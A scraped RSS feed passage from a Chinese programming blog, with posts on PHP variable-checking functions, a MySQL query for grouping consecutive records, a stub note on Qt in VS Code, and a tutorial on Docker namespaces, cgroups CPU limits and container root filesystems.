程序是代码的可执行镜像&amp;#xff0c;通常…阅读更多...请求的响应----状态码分为五大类(爬虫)前言 一个爬虫的成功与否&amp;#xff0c;在于你是否拿到了想要的数据&amp;#xff1b;一个请求的成功与否&amp;#xff0c;在于响应的状态码&amp;#xff0c;它标明了当前请求下这个响应的结果&amp;#xff0c;是好还是坏。上节课程学习了HTTPS和HTTP协议的各自优势&amp;#xff0c;本节课程进入到请求…阅读更多...SpringCloud Gateway 网关路由全自动实现方案动态网关路由 
实现动态路由需要将路由配置保存到Nacos&amp;#xff0c;然后在网关监听Nacos中的路由配置&amp;#xff0c;并实现配置热更新&amp;#xff0c;然而网关路由并不是自定义业务配置属性&amp;#xff0c;本身不具备热更新功能&amp;#xff01; 详情可以参考org.springframework.cloud.gat…阅读更多...今日总结10.18Exception 和Error 有什么区别 
Exception和Error都是Java等编程语言中异常处理机制的重要组成部分&amp;#xff0c;它们都继承自Throwable类。以下是两者的主要区别&amp;#xff1a; 
定义与性质 
Error&amp;#xff1a; 
1.表示严重的系统级错误&amp;#xff0c;如内存溢出&amp;#xff08;OutOfM…阅读更多...01_MVCC（多版本并发机制）MVCC&amp;#xff08;多版本并发机制&amp;#xff09; 文章目录 MVCC&amp;#xff08;多版本并发机制&amp;#xff09;简介工作原理主要组件 事务隔离级别与 MVCC实现方式快照读&amp;#xff08;Snapshot Read&amp;#xff09;当前读&amp;#xff08;Current Read&amp;#xff09;版本链管理 MVCC 的优缺点优点缺…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径一个白噪声+滤波器demodocker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:30 +0000</pubDate>
    </item>
    <item>
      <title>VS Code开发qt项目</title>
      <link>https://www.ppmy.cn/news/1540391.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维VS Code开发qt项目news/2025/10/31 17:53:29/没整明白，尴尬安装扩展设置cmake路径 前提是已经安装了QT报错用msvc选windows启动，用mingw则选gdb启动http://www.ppmy.cn/news/1540391.html相关文章php之is_null、empty 、isset 的区别目录 
1.isset()&amp;#xff1a; 
2.empty()&amp;#xff1a; 
3.is_null&amp;#xff1a; 
4.总结&amp;#xff1a; 在PHP中&amp;#xff0c;is_null、empty 和 isset 是三个用于检查变量状态的常用函数&amp;#xff0c;它们各自有不同的用途和行为&amp;#xff1a; 
1.isset()&amp;#xff1a; 
isset() 函数…阅读更多...MySQL 查找连续相同名称的记录组，并保留每组内时间最大的一条记录要求&amp;#xff1a;查找连续相同名称的记录组&amp;#xff0c;并保留每组内时间最大的一条记录&amp;#xff0c;同时计算每组记录的 num 总和。 今天有人问了我一个问题&amp;#xff0c;大致就是下面这样的数据结构&amp;#xff08;原谅我实在不知道怎么描述这个问题&amp;#xff09; 然后需要得到下面…阅读更多...[k8s理论知识]3.docker基础（二）隔离技术容器其实是一种沙盒技术&amp;#xff0c;其核心是通过约束和修改进程的动态表现&amp;#xff0c;为其创建一个边界。这个边界确保了应用与应用之间不会相互干扰&amp;#xff0c;同时可以方便在不同的环境中迁移&amp;#xff0c;这是PaaS最理想的状态。 
程序是代码的可执行镜像&amp;#xff0c;通常…阅读更多...请求的响应----状态码分为五大类(爬虫)前言 一个爬虫的成功与否&amp;#xff0c;在于你是否拿到了想要的数据&amp;#xff1b;一个请求的成功与否&amp;#xff0c;在于响应的状态码&amp;#xff0c;它标明了当前请求下这个响应的结果&amp;#xff0c;是好还是坏。上节课程学习了HTTPS和HTTP协议的各自优势&amp;#xff0c;本节课程进入到请求…阅读更多...SpringCloud Gateway 网关路由全自动实现方案动态网关路由 
实现动态路由需要将路由配置保存到Nacos&amp;#xff0c;然后在网关监听Nacos中的路由配置&amp;#xff0c;并实现配置热更新&amp;#xff0c;然而网关路由并不是自定义业务配置属性&amp;#xff0c;本身不具备热更新功能&amp;#xff01; 详情可以参考org.springframework.cloud.gat…阅读更多...今日总结10.18Exception 和Error 有什么区别 
Exception和Error都是Java等编程语言中异常处理机制的重要组成部分&amp;#xff0c;它们都继承自Throwable类。以下是两者的主要区别&amp;#xff1a; 
定义与性质 
Error&amp;#xff1a; 
1.表示严重的系统级错误&amp;#xff0c;如内存溢出&amp;#xff08;OutOfM…阅读更多...01_MVCC（多版本并发机制）MVCC&amp;#xff08;多版本并发机制&amp;#xff09; 文章目录 MVCC&amp;#xff08;多版本并发机制&amp;#xff09;简介工作原理主要组件 事务隔离级别与 MVCC实现方式快照读&amp;#xff08;Snapshot Read&amp;#xff09;当前读&amp;#xff08;Current Read&amp;#xff09;版本链管理 MVCC 的优缺点优点缺…阅读更多...利用 Llama 3.1模型 + Dify开源LLM应用开发平台，在你的Windows环境中搭建一套AI工作流文章目录 1. 什么是Ollama&amp;#xff1f;2. 什么是Dify&amp;#xff1f;3. 下载Ollama4. 安装Ollama5. Ollama Model library模型库6. 本地部署Llama 3.1模型7. 安装Docker Desktop8. 使用Docker-Compose部署Dify9. 注册Dify账号10. 集成本地部署的 Llama 3.1模型11. 集成智谱AI大模型…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径docker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:30 +0000</pubDate>
    </item>
    <item>
      <title>php之is_null、empty 、isset 的区别</title>
      <link>https://www.ppmy.cn/news/1540389.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维php之is_null、empty 、isset 的区别news/2025/10/31 17:53:28/目录1.isset()：2.empty()：3.is_null：4.总结：在PHP中，is_null、empty和isset是三个用于检查变量状态的常用函数，它们各自有不同的用途和行为：1.isset()：isset()函数用来检查一个变量是否已设置并且非null。如果变量存在并且已经被初始化（即不是null），isset()返回true。如果变量未定义或其值为null，isset()返回false。代码示例：$var = null;
if (isset($var)) {echo "变量已设置";
} else {echo "变量未设置";
}
// 输出：变量未设置2.empty()：empty()函数用来检查一个变量是否为空。如果变量的值被认为是“空”的（例如""空字符串、0、0.0、"0"、null、false、未定义的变量），empty()返回true。如果变量非空，empty()返回false。代码示例：$var = null;
if (empty($var)) {echo "变量为空";
} else {echo "变量非空";
}
// 输出：变量为空3.is_null：is_null()函数用来检查一个变量是否严格等于null。只有当变量的值严格为null时，is_null()才返回true。代码示例：$var = null;
if ($var === null) {echo "变量的值为null";
} else {echo "变量的值不是null";
}
// 输出：变量的值为null4.总结：isset()检查变量是否已设置且不是null。empty()检查变量是否为空，包括null、false、0、空字符串等。is_null()严格检查变量是否等于null。在实际编程中，根据需要检查的条件不同，你可能会使用这三个函数中的一个或多个。例如，如果你想确保一个变量不仅已设置，而且有非空的值，你可以结合使用isset()和empty()：if (isset($var) &amp;&amp; !empty($var)) {// 变量已设置且非空
}如果你想检查一个变量是否为null或者为空字符串，你可以结合使用is_null()和empty()：if (is_null($var) || $var === "") {// 变量的值为null或空字符串
}以下用一张表搞清楚is_null、empty、isset的区别变量is_nullemptyisset$a=""falsetruetrue$a=" "falsefalsetrue$a=nulltruetruefalse$atruetruefalse$a=array()falsetruetrue$a=falsefalsetruetrue$a=8falsefalsetrue$a=1falsefalsetrue$a=0falsetruetrue$a="0"falsetruetrue$a="true"falsefalsetrue$a="false"falsefalsetruehttp://www.ppmy.cn/news/1540389.html相关文章MySQL 查找连续相同名称的记录组，并保留每组内时间最大的一条记录要求&amp;#xff1a;查找连续相同名称的记录组&amp;#xff0c;并保留每组内时间最大的一条记录&amp;#xff0c;同时计算每组记录的 num 总和。 今天有人问了我一个问题&amp;#xff0c;大致就是下面这样的数据结构&amp;#xff08;原谅我实在不知道怎么描述这个问题&amp;#xff09; 然后需要得到下面…阅读更多...[k8s理论知识]3.docker基础（二）隔离技术容器其实是一种沙盒技术&amp;#xff0c;其核心是通过约束和修改进程的动态表现&amp;#xff0c;为其创建一个边界。这个边界确保了应用与应用之间不会相互干扰&amp;#xff0c;同时可以方便在不同的环境中迁移&amp;#xff0c;这是PaaS最理想的状态。 
程序是代码的可执行镜像&amp;#xff0c;通常…阅读更多...请求的响应----状态码分为五大类(爬虫)前言 一个爬虫的成功与否&amp;#xff0c;在于你是否拿到了想要的数据&amp;#xff1b;一个请求的成功与否&amp;#xff0c;在于响应的状态码&amp;#xff0c;它标明了当前请求下这个响应的结果&amp;#xff0c;是好还是坏。上节课程学习了HTTPS和HTTP协议的各自优势&amp;#xff0c;本节课程进入到请求…阅读更多...SpringCloud Gateway 网关路由全自动实现方案动态网关路由 
实现动态路由需要将路由配置保存到Nacos&amp;#xff0c;然后在网关监听Nacos中的路由配置&amp;#xff0c;并实现配置热更新&amp;#xff0c;然而网关路由并不是自定义业务配置属性&amp;#xff0c;本身不具备热更新功能&amp;#xff01; 详情可以参考org.springframework.cloud.gat…阅读更多...今日总结10.18Exception 和Error 有什么区别 
Exception和Error都是Java等编程语言中异常处理机制的重要组成部分&amp;#xff0c;它们都继承自Throwable类。以下是两者的主要区别&amp;#xff1a; 
定义与性质 
Error&amp;#xff1a; 
1.表示严重的系统级错误&amp;#xff0c;如内存溢出&amp;#xff08;OutOfM…阅读更多...01_MVCC（多版本并发机制）MVCC&amp;#xff08;多版本并发机制&amp;#xff09; 文章目录 MVCC&amp;#xff08;多版本并发机制&amp;#xff09;简介工作原理主要组件 事务隔离级别与 MVCC实现方式快照读&amp;#xff08;Snapshot Read&amp;#xff09;当前读&amp;#xff08;Current Read&amp;#xff09;版本链管理 MVCC 的优缺点优点缺…阅读更多...利用 Llama 3.1模型 + Dify开源LLM应用开发平台，在你的Windows环境中搭建一套AI工作流文章目录 1. 什么是Ollama&amp;#xff1f;2. 什么是Dify&amp;#xff1f;3. 下载Ollama4. 安装Ollama5. Ollama Model library模型库6. 本地部署Llama 3.1模型7. 安装Docker Desktop8. 使用Docker-Compose部署Dify9. 注册Dify账号10. 集成本地部署的 Llama 3.1模型11. 集成智谱AI大模型…阅读更多...计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13 目录 文章目录 计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13目录1. The Cognitive Capabilities of Generative AI: A Comparative Analysis with Human Benchmarks2. WALL-E: World Alig…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径docker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:28 +0000</pubDate>
    </item>
    <item>
      <title>MySQL 查找连续相同名称的记录组，并保留每组内时间最大的一条记录</title>
      <link>https://www.ppmy.cn/news/1540388.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维MySQL 查找连续相同名称的记录组，并保留每组内时间最大的一条记录news/2025/10/31 17:53:27/要求：查找连续相同名称的记录组，并保留每组内时间最大的一条记录，同时计算每组记录的 num 总和。今天有人问了我一个问题，大致就是下面这样的数据结构（原谅我实在不知道怎么描述这个问题）然后需要得到下面这样的结果直接上SQL，因为这个也不是我能写出来的，是我跟 GPT 磕了半个小时才得到的，这里只是做个记录防止下次要用又不知道怎么描述，所以大家要是需要直接用但是不要问我具体实现逻辑WITHGroupedProcessesAS(SELECTid,name,create_time,num,-- 如果相邻两条记录的 name 不同，则标记新组CASEWHENname=LAG(name)OVER(ORDERBYid)THEN0ELSE1ENDASisNewGroupFROMtable_ceshi),NumberedGroupsAS(SELECTid,name,create_time,num,-- 根据 isNewGroup 的累加值生成组编号SUM(isNewGroup)OVER(ORDERBYid)ASgroupNumFROMGroupedProcesses),MaxTimePerGroupAS(-- 找出每组内 create_time 最大的记录SELECTgroupNum,name,MAX(create_time)ASmax_timeFROMNumberedGroupsGROUPBYgroupNum,name)SELECTg.id,g.name,m.max_timeAScreate_time,SUM(g.num)AStotalNum-- 按组计算 num 的和FROMNumberedGroups gJOINMaxTimePerGroup mONg.groupNum=m.groupNumANDg.name=m.nameGROUPBYg.groupNum,g.name,m.max_timeORDERBYm.max_time;http://www.ppmy.cn/news/1540388.html相关文章[k8s理论知识]3.docker基础（二）隔离技术容器其实是一种沙盒技术&amp;#xff0c;其核心是通过约束和修改进程的动态表现&amp;#xff0c;为其创建一个边界。这个边界确保了应用与应用之间不会相互干扰&amp;#xff0c;同时可以方便在不同的环境中迁移&amp;#xff0c;这是PaaS最理想的状态。 
程序是代码的可执行镜像&amp;#xff0c;通常…阅读更多...请求的响应----状态码分为五大类(爬虫)前言 一个爬虫的成功与否&amp;#xff0c;在于你是否拿到了想要的数据&amp;#xff1b;一个请求的成功与否&amp;#xff0c;在于响应的状态码&amp;#xff0c;它标明了当前请求下这个响应的结果&amp;#xff0c;是好还是坏。上节课程学习了HTTPS和HTTP协议的各自优势&amp;#xff0c;本节课程进入到请求…阅读更多...SpringCloud Gateway 网关路由全自动实现方案动态网关路由 
实现动态路由需要将路由配置保存到Nacos&amp;#xff0c;然后在网关监听Nacos中的路由配置&amp;#xff0c;并实现配置热更新&amp;#xff0c;然而网关路由并不是自定义业务配置属性&amp;#xff0c;本身不具备热更新功能&amp;#xff01; 详情可以参考org.springframework.cloud.gat…阅读更多...今日总结10.18Exception 和Error 有什么区别 
Exception和Error都是Java等编程语言中异常处理机制的重要组成部分&amp;#xff0c;它们都继承自Throwable类。以下是两者的主要区别&amp;#xff1a; 
定义与性质 
Error&amp;#xff1a; 
1.表示严重的系统级错误&amp;#xff0c;如内存溢出&amp;#xff08;OutOfM…阅读更多...01_MVCC（多版本并发机制）MVCC&amp;#xff08;多版本并发机制&amp;#xff09; 文章目录 MVCC&amp;#xff08;多版本并发机制&amp;#xff09;简介工作原理主要组件 事务隔离级别与 MVCC实现方式快照读&amp;#xff08;Snapshot Read&amp;#xff09;当前读&amp;#xff08;Current Read&amp;#xff09;版本链管理 MVCC 的优缺点优点缺…阅读更多...利用 Llama 3.1模型 + Dify开源LLM应用开发平台，在你的Windows环境中搭建一套AI工作流文章目录 1. 什么是Ollama&amp;#xff1f;2. 什么是Dify&amp;#xff1f;3. 下载Ollama4. 安装Ollama5. Ollama Model library模型库6. 本地部署Llama 3.1模型7. 安装Docker Desktop8. 使用Docker-Compose部署Dify9. 注册Dify账号10. 集成本地部署的 Llama 3.1模型11. 集成智谱AI大模型…阅读更多...计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13 目录 文章目录 计算机前沿技术-人工智能算法-大语言模型-最新研究进展-2024-10-13目录1. The Cognitive Capabilities of Generative AI: A Comparative Analysis with Human Benchmarks2. WALL-E: World Alig…阅读更多...Open-WebUIOpen-WebUI特点⭐ 
️直观的界面&amp;#xff1a;聊天界面从 ChatGPT 中汲取灵感&amp;#xff0c;确保用户友好的体验。响应式设计&amp;#xff1a;在桌面和移动设备上享受无缝体验。⚡快速响应&amp;#xff1a;享受快速响应的性能。轻松设置&amp;#xff1a;使用 Docker 或 Kubernetes&amp;#xff08;…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径docker compose 安装 neo4jOracle数据库七种闪回技术详解与实践示例分享一个Oracle表空间自动扩容与清理脚本精密封装，“芯”系未来：哲讯科技SAP解决方案引领芯片封装产业智造升级2025年市场上卷饼机厂家排行榜：权威推荐与选择指南2025年市场上​    烤鸭饼机工厂推荐榜：揭秘行业领先的烤鸭饼机制造商选择指南Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 09:53:27 +0000</pubDate>
    </item>
    <item>
      <title>[k8s理论知识]3.docker基础（二）隔离技术</title>
      <link>https://www.ppmy.cn/news/1540387.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维[k8s理论知识]3.docker基础（二）隔离技术news/2025/10/31 17:53:26/容器其实是一种沙盒技术，其核心是通过约束和修改进程的动态表现，为其创建一个边界。这个边界确保了应用与应用之间不会相互干扰，同时可以方便在不同的环境中迁移，这是PaaS最理想的状态。程序是代码的可执行镜像，通常以二进制文件的形式存储在磁盘上。但是当程序被执行时，操作系统会将程序的数据加载到内存中，读取计算指令并指示CPU执行。CPU与内存协作进行计算，使用寄存器存放数值，内存堆栈保存执行的命令和变量，此外，程序还可能打开文件和调用IO设备。所有这些状态信息和数据信息的集合，构成了进程的动态表现。进程可以理解为是动态的程序，但更准确地说，进程是程序在计算机系统中的一个执行实例。程序本身只是静态的代码文件（通常指由源代码编译得到的可执行文件），而进程则是该程序的一个活动状态，它包含了程序的执行上下文和资源。那么，如果给进程之间确立边界，也就是给程序创建了边界。而容器技术的核心，就是通过约束和修改进程的动态表现，从而为其创造一个边界。Nampespace技术启动一个busybox容器，通过以下操作让我们更好的理解进程隔离。[root@master ~]# docker run -it busybox:v1 /bin/sh
/ # pid
/bin/sh: pid: not found
/ # ps
PID   USER     TIME  COMMAND1 root      0:00 /bin/sh6 root      0:00 ps可以看到，我们在 Docker 里最开始执行的 /bin/sh，就是这个容器内部的第 1 号进程（PID=1），而这个容器里一共只有两个进程在运行。这就意味着，前面执行的 /bin/sh，以及我们刚刚执行的 ps，已经被 Docker 隔离在了一个跟宿主机完全不同的世界当中。当我们不要关闭这个命令行（否则容器会销毁），而打开另一个窗口，查看这个容器的pid，可以看到这个容器的PID实际为16043。[root@master ~]# docker ps | grep busybox
e45240f24ffb   busybox:v1                                          "/bin/sh"                 12 seconds ago   Up 11 seconds             epic_moser
[root@master ~]# docker inspect --format '{{.State.Pid}}' e45240f24ffb 
16043以上表述实际上是非常不严谨的，因为容器本身没有PID，容器只是为程序提供一个隔离的视图，而运行在容器里的程序（在我们的例子中是/bin/bash）才拥有PID。也就是说在查看容器的PID的时候，查看的实际上是它内部程序的PID。所以我们可以理解，这个bin/bash本身的PID是16043，而容器实施了一个障眼法，让前面的所有PID都看不见了，这个程序的PID也就成了1。事实上，以上只是将进程空间进行了Namespace隔离，容器还需要进行文件系统、IO设备等的隔离。这些在后面会一一演示。在理解了 Namespace 的工作方式之后，你就会明白，跟真实存在的虚拟机不同，在使用 Docker 的时候，并没有一个真正的“Docker 容器”运行在宿主机里面。Docker 项目帮助用户启动的，还是原来的应用进程，只不过在创建这些进程时，Docker 为它们加上了各种各样的 Namespace 参数。Cgroups从上面例子可以看出，Namespace技术改变了进程看待计算机的视图，但是计算机并没有改变看待进程的视图，对于底层操作系统而言，容器里的进程和直接运行的进程没有区别。也就是说，虽然上面例子中的bin/bash进程表面上被隔离了起来，但是实际上它能得到的内存和cpu资源，却可以随意的被其他进程占用。而这个进程本身也可以吃掉别的进程的资源，这不符合一个沙盒的行为表现。而且，在linux内核中，有很多的资源是不能namespace化的，比如时间。Linux Cgroups的全称是 Linux Control Group。它最主要的作用，就是限制一个进程组能够使用的资源上限，包括 CPU、内存、磁盘、网络带宽等等。通过以下命令可以看到cgroup在系统中挂载的位置。[root@master ~]# mount -t cgroup 
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/usr/lib/systemd/systemd-cgroups-agent,name=systemd)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpuacct,cpu)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_prio,net_cls)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)可以看到，在 /sys/fs/cgroup 下面有很多诸如 cpuset、cpu、 memory 这样的子目录，也叫子系统。这些都是我这台机器当前可以被 Cgroups 进行限制的资源种类。我们进入CPU目录，可以看到有很多cpu的配置文件。在这些文件中，文件夹container是我们后来创建的。当我们进入container文件夹，会看到里面已经创建了完整的cgoups文件系统。 这是因为当你在cgroups的某个子系统（比如cpu或者sys等），你实际上在创建一个新的控制组，控制组允许你为该组内的进程设置资源限制或监控资源使用情况。因此Linux内核会在这个子目录下生成一系列与该子系统相关的文件。但是这些文件实际上是虚拟的，并不是存储载物理磁盘上的文件，只是为用户提供的与内核交互的接口。随后打开另一个终端，执行以下命令。这条命令是一个死循环，会吃光所有cpu资源。可以看到这个进程PID是47975。接下来进入container目录， 看到 container 控制组里的 CPU quota 还没有任何限制（即：-1），CPU period 则是默认的 100  ms（100000  us）[root@master container]# cat cpu.cfs_period_us 
100000
[root@master container]# cat cpu.cfs_quota_us 
-1接下来我们进行控制组的限制操作，向container组里的cfs_quota和cfs_period文件写入参数进行限制。以下的操作意思是100000us（100ms）里面有20000us（20ms）可以给这个控制组使用。接下来要将这个PID（47975）放入这个控制组。重新用top命令查看，发现 它虽然是一个死循环，但是只占用了20%的cpu资源。控制组不是每一个Linux进程都有自己的控制组，但是每个进程都会属于某一个资源控制组。在没有配置自定义cgroups的情况下，所有进程都会被分配到系统的默认控制组，这些默认的cgroups通常是由init系统（如systemd）或直接由内核管理的。多个进程也可以被放置在同一个控制组中。比如说我们查看cgroup/cpu里的user.slice文件夹，可以看到里面有一个procs文件，打开可以看到这个资源控制组的所有进程。假设有一个进程PID是12345，我们可以将它加入控制组中。echo 12345 &gt; /sys/fs/cgroup/cpu/user.slice/cgroup.procs创建一个docker，并规定了他的cpu资源限制。可以看到docker ID是b47efc8e7d29，cgroup目录是system.slice下的以b47efc8e7d29开头的文件夹。[root@master ~]# docker run  -it --cpu-period=100000 --cpu-quota=20000 ubuntu /bin/bash
root@b47efc8e7d29:/# cat /proc/self/cgroup
11:pids:/system.slice/docker-b47efc8e7d291be37292fdf8edb160947e2bfa413595f90d6d4960f7b22a3edf.scope
10:memory:/system.slice/docker-b47efc8e7d291be37292fdf8edb160947e2bfa413595f90d6d4960f7b22a3edf.scope
9:perf_event:/system.slice/docker-b47efc8e7d291be37292fdf8edb160947e2bfa413595f90d6d4960f7b22a3edf.scope
8:cpuset:/system.slice/docker-b47efc8e7d291be37292fdf8edb160947e2bfa413595f90d6d4960f7b22a3edf.scope
7:net_prio,net_cls:/system.slice/docker-b47efc8e7d291be37292fdf8edb160947e2bfa413595f90d6d4960f7b22a3edf.scope
6:devices:/system.slice/docker-b47efc8e7d291be37292fdf8edb160947e2bfa413595f90d6d4960f7b22a3edf.scope
5:blkio:/system.slice/docker-b47efc8e7d291be37292fdf8edb160947e2bfa413595f90d6d4960f7b22a3edf.scope
4:cpuacct,cpu:/system.slice/docker-b47efc8e7d291be37292fdf8edb160947e2bfa413595f90d6d4960f7b22a3edf.scope
3:hugetlb:/system.slice/docker-b47efc8e7d291be37292fdf8edb160947e2bfa413595f90d6d4960f7b22a3edf.scope
2:freezer:/system.slice/docker-b47efc8e7d291be37292fdf8edb160947e2bfa413595f90d6d4960f7b22a3edf.scope
1:name=systemd:/system.slice/docker-b47efc8e7d291be37292fdf8edb160947e2bfa413595f90d6d4960f7b22a3edf.scope进入文件夹，可以看到他的cpu资源限制。 也就是说docker可以在创建容器的时候进行资源限制。[root@master system.slice]# cd docker-b47efc8e7d291be37292fdf8edb160947e2bfa413595f90d6d4960f7b22a3edf.scope/
[root@master docker-b47efc8e7d291be37292fdf8edb160947e2bfa413595f90d6d4960f7b22a3edf.scope]# ls
cgroup.clone_children  cgroup.procs  cpuacct.usage         cpu.cfs_period_us  cpu.rt_period_us   cpu.shares  notify_on_release
cgroup.event_control   cpuacct.stat  cpuacct.usage_percpu  cpu.cfs_quota_us   cpu.rt_runtime_us  cpu.stat    tasks
[root@master docker-b47efc8e7d291be37292fdf8edb160947e2bfa413595f90d6d4960f7b22a3edf.scope]# cat cpu.rt_period_us 
1000000
[root@master docker-b47efc8e7d291be37292fdf8edb160947e2bfa413595f90d6d4960f7b22a3edf.scope]# cat cpu.cfs_quota_us 
20000echo操作/sys/fs/cgroup/cpu/container/cgroup.procs 和 /sys/fs/cgroup/cpu/container/cpu.cfs_quota_us 这两个文件的行为是不同的，所以当我们进行echo操作的时候，写入cpu.cfs_quota_us 文件的行为是覆盖式的。当你使用 echo 写入一个新的值时，它会替换掉之前的值。cgroup.procs 是一个特殊的文件，它的目的是让用户通过写入进程 ID 来动态管理进程所属的控制组。因此它的行为不是像普通文件那样追加或覆盖内容，而是执行一个动作（将进程加入到该控制组）。文件系统如果不进行单的文件系统挂载，容器内的进程的文件系统视图就是整个物理主机的视图。所以在容器创建之前，docker通过重新挂载根目录，从而让容器进程看到的是一个独立的隔离环境。为了能够让容器的这个根目录看起来更“真实”，Docker会在这个容器的根目录下挂载一个完整操作系统的文件系统，比如 Ubuntu16.04 的 ISO。这样，在容器启动之后，我们在容器里通过执行 "ls /" 查看根目录下的内容，就是 Ubuntu 16.04 的所有目录和文件。而挂载在容器根目录上，用来为进程提供隔离后环境的文件的操作系统，就是所谓的容器镜像。它还有一个更为专业的名字，叫作：rootfs（根文件系统）。值得注意的是，rootfs只是一个操作系统所包含的文件、配置和目录，并不包含操作系统的内核。Linux操作系统分为两部分，内核和用户态。内核：这是操作系统的核心，负责与硬件交互、调度进程、管理内存、网络、文件系统等。无论是ubuntu、centos还是其他linux发行版的内核，他们的核心功能是相同的。用户态：这是操作系统中用户可以直接接触的部分，比如程序、库、配置文件等等。不同的linux发行版（linux/ubuntu/debian）在用户态可能有很大不同，包括包管理、配置文件等。对于容器来讲，操作系统就是宿主机的操作系统内核。所以说，当你拉取一个 CentOS 